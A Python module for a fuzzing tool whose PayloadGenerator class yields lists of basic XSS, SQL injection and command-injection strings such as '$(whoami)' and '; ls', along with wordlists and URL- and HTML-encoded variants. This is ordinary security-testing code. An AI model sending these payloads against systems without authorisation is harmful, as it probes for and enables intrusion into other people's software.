"""
Payload generators for fuzzing
"""

from typing import List, Iterator
from pathlib import Path


class PayloadGenerator:
    """Generate payloads for fuzzing attacks"""
    
    COMMON_WORDLIST = [
        'admin', 'test', 'password', '123456', 'root',
        'user', 'guest', 'api', 'api_key', 'token',
        'id', 'user_id', 'session', 'session_id',
    ]
    
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
    ]
    
    SQL_INJECTION_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' UNION SELECT NULL--",
        "1' AND '1'='1",
        "1' AND '1'='2",
    ]
    
    COMMAND_INJECTION_PAYLOADS = [
        "; ls",
        "| whoami",
        "& dir",
        "`id`",
        "$(whoami)",
    ]
    
    def __init__(self):
        self.custom_wordlists: List[str] = []
    
    def generate_from_wordlist(self, wordlist: List[str]) -> Iterator[str]:
        """Generate payloads from a wordlist"""
        for word in wordlist:
            yield word
    
    def generate_numbers(self, start: int = 0, end: int = 1000) -> Iterator[str]:
        """Generate number range payloads"""
        for i in range(start, end + 1):
            yield str(i)
    
    def generate_xss(self) -> Iterator[str]:
        """Generate XSS payloads"""
        for payload in self.XSS_PAYLOADS:
            yield payload
    
    def generate_sql_injection(self) -> Iterator[str]:
        """Generate SQL injection payloads"""
        for payload in self.SQL_INJECTION_PAYLOADS:
            yield payload
    
    def generate_command_injection(self) -> Iterator[str]:
        """Generate command injection payloads"""
        for payload in self.COMMAND_INJECTION_PAYLOADS:
            yield payload
    
    def generate_common(self) -> Iterator[str]:
        """Generate common wordlist payloads"""
        for word in self.COMMON_WORDLIST:
            yield word
    
    def load_wordlist(self, file_path: Path) -> List[str]:
        """Load wordlist from file"""
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    
    def generate_combinations(
        self,
        base: str,
        variations: List[str]
    ) -> Iterator[str]:
        """Generate payload combinations"""
        for variation in variations:
            yield f"{base}{variation}"
            yield f"{variation}{base}"
            yield f"{variation}{base}{variation}"
    
    def generate_encoded(self, payload: str) -> Iterator[str]:
        """Generate URL/HTML encoded variants"""
        import urllib.parse
        
        yield payload
        yield urllib.parse.quote(payload)
        yield urllib.parse.quote_plus(payload)
        yield urllib.parse.quote(payload, safe='')
        
        # HTML encoding
        yield payload.replace('<', '&lt;').replace('>', '&gt;')
        yield payload.replace('"', '&quot;').replace("'", '&#39;')

